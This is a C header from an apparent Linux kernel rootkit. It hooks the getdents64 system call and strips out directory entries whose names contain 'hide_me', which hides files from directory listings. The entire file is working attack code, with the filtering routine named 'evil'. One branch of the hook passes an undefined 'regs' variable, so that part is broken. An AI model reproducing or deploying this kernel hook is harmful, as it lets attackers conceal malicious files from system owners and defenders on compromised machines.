#pragma once

#include <linux/cred.h>
#include <linux/linkage.h>
#include <linux/stddef.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/proc_ns.h>


char* MAGIC_WORD = "hide_me";


/* Just so we know what the linux_dirent looks like.
   actually defined in fs/readdir.c
   exported in linux/syscalls.h
struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char		d_name[];
};
*/


int evil(struct linux_dirent __user * dirent, int res) {    
    int err;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;

    kdirent = kzalloc(res, GFP_KERNEL);
	if (kdirent == NULL){
        printk(KERN_DEBUG "kzalloc failed\n");
		return res;
    }

	err = copy_from_user(kdirent, dirent, res);
	if (err){
        printk(KERN_DEBUG "can not copy from user!\n");
		goto out;
    }

	while (off < res) {
		dir = (void *)kdirent + off;
		if (strstr(dir->d_name, MAGIC_WORD)) {
			if (dir == kdirent) {
				res -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, res);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, res);
	if (err){
        printk(KERN_DEBUG "can not copy back to user!\n");
		goto out;
    }
    out:
	    kfree(kdirent);
    return res;
}
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_sys_getdents64)(const struct pt_regs*);

static asmlinkage int hook_sys_getdents64(const struct pt_regs* regs) {
    struct linux_dirent __user *dirent = SECOND_ARG(regs, struct linux_dirent __user *);
    int res;
    
    res = orig_sys_getdents64(regs);

    printk(KERN_DEBUG "orig_sys_getdents64 done\n");

    if (res <= 0){
        // The original getdents failed - we aint mangling with that.
		return res;
    }

    res = evil(dirent, res);
    
    return res;
}
#else
static asmlinkage long (*orig_sys_getdents64)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);

static asmlinkage int hook_sys_getdents64(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
    int res;
    
    res = orig_sys_getdents64(regs);

    printk(KERN_DEBUG "orig_sys_getdents64 done\n");

    if (res <= 0){
        // The original getdents failed - we aint mangling with that.
		return res;
    }

    res = evil(dirent, res);
    
    return res;
}
#endif
